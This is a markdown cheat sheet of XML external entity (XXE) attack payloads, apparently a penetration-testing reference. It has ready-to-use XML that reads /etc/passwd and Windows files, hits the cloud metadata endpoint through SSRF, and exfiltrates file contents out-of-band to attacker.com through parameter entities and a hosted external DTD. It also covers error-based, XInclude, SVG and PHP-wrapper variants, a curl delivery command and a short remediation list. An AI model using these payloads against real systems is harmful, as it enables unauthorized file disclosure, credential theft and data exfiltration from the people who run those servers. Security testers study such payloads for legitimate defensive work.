# XXE — Complete Attack Guide

## 1. Detection

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB Detection
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>
<root>&xxe;</root>
```

## 2. Exploitation

### 2.1 File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Windows -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
```

### 2.2 SSRF via XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

### 2.3 Blind XXE (Out-of-Band)
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
]>
<root>test</root>
```

### 2.4 Error-Based XXE
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
```

### 2.5 XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 2.6 SVG-Based XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## 3. Bypass Techniques

### 3.1 Encoding Bypass
```xml
<?xml version="1.0" encoding="UTF-16"?>
```

### 3.2 Parameter Entity in External DTD
```xml
<!-- External DTD hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### 3.3 PHP Wrapper
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## 4. Tools

### nuclei
```bash
nuclei -u http://target -tags xxe
```

### Manual Testing
```bash
# Send XXE via curl
curl -X POST http://target/api/xml -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

## 5. Remediation

1. **Disable external entity processing** — Most modern parsers disable by default
2. **Use JSON instead of XML** — Avoid XML parsing entirely
3. **Input validation** — Sanitize XML input
4. **WAF rules** — Block DOCTYPE declarations
